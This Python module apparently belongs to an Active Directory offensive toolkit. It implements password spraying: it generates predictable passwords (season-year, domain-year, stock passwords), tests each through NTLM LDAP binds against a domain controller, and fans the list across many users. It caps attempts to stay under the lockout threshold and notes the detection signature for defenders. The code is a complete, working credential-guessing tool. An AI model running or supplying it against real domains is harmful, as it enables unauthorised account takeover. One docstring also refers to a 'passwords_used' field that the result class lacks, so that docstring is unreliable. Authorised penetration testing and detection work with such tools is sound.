"""
Password spray pre-check (brief §4.8).

Once an operator has a user list (from ``--asrep`` candidates or full
user enumeration), the next move is often to try a small dictionary of
predictable passwords. This module ships:

  * a wordlist generator that produces the usual season/year and
    domain/year patterns ("Spring2026!", "CORP2026", "Welcome1", ...)
  * a single-credential check (one LDAP bind attempt)
  * a sprayer that fans the dictionary across a user list with
    rate / lockout safety

Lockout safety
--------------
Each failed bind costs one ``badPwdCount`` increment per user. AD locks
the account when the count hits ``lockoutThreshold``. We compute the
safe upper bound once, refuse to send more attempts than ``threshold-1``
per user without explicit operator override, and surface the policy
in the confirmation prompt.

Why LDAP bind and not Kerberos AS-REQ
-------------------------------------
Both increment ``badPwdCount``. LDAP bind is one socket per attempt and
rides the existing ldap3 dependency — no impacket Kerberos plumbing
needed. Kerberos AS-REQ would be marginally quieter on Windows event
logs but the brief doesn't ask for that distinction; this is a
pre-check, not a covert spray.

Detection (defender side)
-------------------------
Spike of 4625 events with the same source IP across many target SAMs
within minutes — the classic spray signature. SOC teams looking at
this PR for IOCs: rate is one bind every ``inter_attempt_seconds``
(default 1.0s), no jitter, single source.
"""

from __future__ import annotations

import datetime
import time
from dataclasses import dataclass

from ldap3 import NTLM, Connection, Server
from ldap3.core.exceptions import LDAPBindError, LDAPException


@dataclass
class SprayHit:
    """One credential pair that bound successfully against the DC."""

    username: str
    password: str


@dataclass
class SprayResult:
    """Outcome of a spray run — operator-facing summary plus the
    individual hits for downstream use (kerb-chain, JSON export)."""

    hits:           list[SprayHit]
    attempts:       int
    skipped_users:  list[str]          # excluded by lockout safety
    aborted:        bool = False        # True if the run hit a hard error


# ───────────────────────────────────────────── wordlist ─


def generate_wordlist(domain: str | None = None,
                      *, year: int | None = None,
                      max_count: int = 24) -> list[str]:
    """Build a small dictionary of likely-set passwords.

    Three buckets, in priority order (we want "Spring2026!" to beat
    "Welcome1" because it's a more domain-specific guess and operators
    usually want to spray fewer attempts before moving on):

      1. Season + year (+ "!"). 4 seasons × 2 years = 8 candidates.
      2. Domain prefix + year (+ "!"). 4 candidates.
      3. Universal stock passwords (Welcome1, Password1, etc.).

    ``year`` defaults to the current year so the list stays evergreen.
    Pass ``year`` for tests so the output is deterministic.
    """
    year = year if year is not None else datetime.datetime.now().year
    out: list[str] = []

    # 1. Season + year
    for season in ("Spring", "Summer", "Autumn", "Winter"):
        for y in (year, year - 1):
            out.append(f"{season}{y}!")

    # 2. Domain prefix + year (uppercase short name, e.g. "CORP")
    if domain:
        prefix = domain.split(".", 1)[0].upper()
        for y in (year, year - 1):
            out.append(f"{prefix}{y}!")
            out.append(f"{prefix}{y}")

    # 3. Universal stock passwords
    out.extend([
        "Welcome1",
        "Password1",
        "Password123",
        "Changeme1!",
        "P@ssw0rd1",
    ])

    # De-dup while preserving order; cap at max_count so we never blow
    # past the lockout-threshold safety bound.
    seen: set[str] = set()
    deduped: list[str] = []
    for pw in out:
        if pw in seen:
            continue
        seen.add(pw)
        deduped.append(pw)
        if len(deduped) >= max_count:
            break
    return deduped


# ───────────────────────────────────────────── lockout gate ─


def safe_password_count(lockout_threshold: int | None,
                        bad_count_buffer: int = 1) -> int | None:
    """Maximum passwords we may try per user without tripping AD lockout.

    AD locks when ``badPwdCount >= lockoutThreshold``. Existing failed
    auths from anywhere on the estate also count, so we leave one slot
    free by default (``bad_count_buffer=1``) — the operator can lower
    it explicitly if they own the policy.

    Returns ``None`` when ``lockoutThreshold == 0`` (lockout disabled,
    spray freely) — caller treats None as "unlimited".
    """
    if lockout_threshold is None:
        # We don't know the policy. Conservative default: assume default
        # AD lockout (5 failed attempts) and leave the buffer.
        return max(1, 5 - bad_count_buffer)
    if lockout_threshold <= 0:
        return None
    return max(1, lockout_threshold - bad_count_buffer)


# ───────────────────────────────────────────── single-attempt ─


def try_credential(dc_ip: str, domain: str, username: str,
                   password: str, *, timeout: float = 5.0) -> bool:
    """One NTLM bind attempt against the DC. Returns True iff the bind
    succeeded. Returns False on any auth failure or network error —
    the operator gets a clean True/False and the spray loop continues."""
    try:
        server = Server(dc_ip, port=389, use_ssl=False,
                        get_info=None, connect_timeout=timeout)
        conn = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=NTLM,
            auto_bind=True,
        )
    except LDAPBindError:
        return False
    except LDAPException:
        return False
    except Exception:
        return False

    try:
        return bool(conn.bound)
    finally:
        try:
            conn.unbind()
        except Exception:
            pass


# ───────────────────────────────────────────── orchestrator ─


def spray(
    dc_ip:                  str,
    domain:                 str,
    users:                  list[str],
    passwords:              list[str],
    *,
    lockout_threshold:      int | None = None,
    inter_attempt_seconds:  float = 1.0,
    on_attempt              = None,    # callback(user, password, hit_bool)
    try_credential_fn       = None,    # injection seam for tests
) -> SprayResult:
    """Spray ``passwords`` against ``users``. Stops trying a given user
    once one of their passwords succeeds (no point continuing) — that's
    the standard spray semantic and the test harness pins it.

    Lockout safety: silently truncates ``passwords`` to
    ``safe_password_count(lockout_threshold)``. If the truncation
    happens, the result's ``passwords_used`` field reflects the
    actually-attempted slice; the caller already gated on the policy
    in the confirmation prompt.
    """
    cap = safe_password_count(lockout_threshold)
    pwd_slice = passwords if cap is None else passwords[:cap]
    skipped_users: list[str] = []  # currently always [], reserved for
                                     # future per-user filters
    fn = try_credential_fn or try_credential

    hits:     list[SprayHit] = []
    attempts: int = 0

    # Outer loop: passwords. Inner: users. This is the canonical spray
    # order — every user gets one attempt of password A before anyone
    # gets attempt B, so a single user account doesn't burn through the
    # whole list back-to-back (which would burn lockout faster).
    successful_users: set[str] = set()
    for password in pwd_slice:
        for user in users:
            if user in successful_users:
                continue
            attempts += 1
            ok = fn(dc_ip, domain, user, password)
            if on_attempt:
                on_attempt(user, password, ok)
            if ok:
                hits.append(SprayHit(username=user, password=password))
                successful_users.add(user)
            if inter_attempt_seconds > 0:
                time.sleep(inter_attempt_seconds)

    return SprayResult(
        hits=hits,
        attempts=attempts,
        skipped_users=skipped_users,
    )
